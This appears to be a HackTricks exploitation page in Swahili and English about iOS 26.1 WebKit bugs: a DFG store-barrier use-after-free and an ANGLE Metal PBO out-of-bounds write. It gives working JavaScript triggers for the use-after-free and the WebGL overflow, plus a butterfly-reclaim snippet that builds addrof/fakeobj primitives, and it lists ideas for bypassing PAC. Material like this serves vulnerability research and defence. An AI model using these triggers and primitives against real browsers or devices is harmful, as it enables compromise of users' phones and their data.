# WebKit DFG Store-Barrier UAF + ANGLE PBO OOB (iOS 26.1)

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari
- **DFG Store Barrier bug (CVE-2025-43529)**: Katika `DFGStoreBarrierInsertionPhase.cpp`, a **Phi node marked escaped while its Upsilon inputs are not** husababisha hatua kuruka kuingiza a **write barrier** kwenye subsequent object stores. Chini ya shinikizo la GC hii inaruhusu JSC kuachilia vitu ambavyo bado vinaweza kufikiwa → **use-after-free**.
- Exploit target: Lazimisha object ya **Date** kuhakikisha butterfly inatengenezwa (mfano, `a[0] = 1.1`) ili butterfly iachiliwe, kisha **irejeshwe** kama uhifadhi wa vipengele vya array ili kuunda mkanganyiko wa boxed/unboxed → `addrof`/`fakeobj` primitives.
- **ANGLE Metal PBO bug (CVE-2025-14174)**: Backend ya Metal inatenga PBO staging buffer kwa kutumia `UNPACK_IMAGE_HEIGHT` badala ya urefu halisi wa texture. Kutoa unpack height ndogo kisha kutuma `texImage2D` kubwa husababisha **staging-buffer OOB write** (~240KB katika PoC hapa chini).
- **PAC blockers on arm64e (iOS 26.1)**: TypedArray `m_vector` na JSArray `butterfly` zimesainiwa na PAC; kutengeneza fake objects na pointers zilizo-chosen na mshambuliaji husababisha crash na `EXC_BAD_ACCESS`/`EXC_ARM_PAC`. Kureuse tu butterflies ambazo tayari zimesainiwa (reinterpretation ya boxed/unboxed) ndizo zinazofanya kazi.

## Kusababisha kupoteza barrier ya DFG → UAF
```js
function triggerUAF(flag, allocCount) {
const A = {p0: 0x41414141, p1: 1.1, p2: 2.2};
arr[arr_index] = A;                 // Tenure A in old space
const a = new Date(1111); a[0] = 1.1; // Force Date butterfly

// GC pressure
for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));

const b = {p0: 0x42424242, p1: 1.1};
let f = b; if (flag) f = 1.1;       // Phi escapes, Upsilon not escaped
A.p1 = f;                           // Missing barrier state set up

for (let i = 0; i < 1e6; ++i) {}    // GC race window
b.p1 = a;                           // Store without barrier → frees `a`/butterfly
}
```
Key points:
- Weka **A** katika old space ili kujaribu generational barriers.
- Tengeneza indexed **Date** ili **butterfly** iwe lengo lililoachiliwa.
- Spray `ArrayBuffer(0x800000)` ili kulazimisha GC na kupanua race.
- The Phi/Upsilon escape mismatch inazuia insertion ya barrier; `b.p1 = a` inaendeshwa **without a write barrier**, hivyo GC inarudisha `a`/butterfly.

## Butterfly kurejeshwa → boxed/unboxed mkanganyiko
Baada ya GC kuachilia Date butterfly, spray arrays ili slab iliyotolewa itumike tena kama elements kwa arrays mbili zenye element kinds tofauti:
```js
boxed_arr[0]   = obj;          // store as boxed pointer
const addr     = ftoi(unboxed_arr[0]); // read as float64 → addr leak
unboxed_arr[0] = itof(addr);   // write pointer bits as float
const fake     = boxed_arr[0]; // reinterpret as object → fakeobj
```
Hali kwenye **iOS 26.1 (arm64e)**:
- **Inafanya kazi:** `addrof`, `fakeobj`, 20+ address leaks per run, inline-slot read/write (on known inline fields).
- **Bado haijakuwa imara:** generalized `read64`/`write64` via inline-slot backings.

## Vizuizi vya PAC kwenye arm64e (kwa nini fake objects zinacrash)
- **TypedArray `m_vector`** na **JSArray `butterfly`** zimesainiwa na PAC; kuunda pointers bandia kunatoa `EXC_BAD_ACCESS` / kwa uwezekano `EXC_ARM_PAC`.
- The confusion primitive inafanya kazi kwa sababu inareuses legitimate signed butterflies; kuingiza unsigned attacker pointers kunashindwa kuthibitishwa.
- Mawazo ya bypass yaliyotajwa: JIT paths zinazoruka auth, gadgets zinazoweza kusaina attacker pointers, au pivoting kupitia ANGLE OOB.

## ANGLE Metal PBO under-allocation → OOB write
Tumia tiny `unpack height` kupunguza staging buffer, kisha upload texture kubwa ili copy izidi mipaka:
```js
gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 16);  // alloc height
// staging = 256 * 16 * 4 = 16KB
// actual  = 256 * 256 * 4 = 256KB → ~240KB OOB

gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F,
256, 256, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
```
Vidokezo:
- Kosa kwenye `TextureMtl.cpp`: buffer ya staging inatumia `UNPACK_IMAGE_HEIGHT` badala ya urefu halisi wa texture kwenye njia ya PBO.
- Katika probe iliyorejelewa, kichocheo cha WebGL2 PBO kimeunganishwa lakini bado hakijaonekana kwa uaminifu kwenye iOS 26.1.

## Marejeo
- [WebKit-UAF-ANGLE-OOB-Analysis](https://github.com/zeroxjf/WebKit-UAF-ANGLE-OOB-Analysis)
- [jir4vv1t/CVE-2025-43529](https://github.com/jir4vv1t/CVE-2025-43529)

{{#include ../../banners/hacktricks-training.md}}
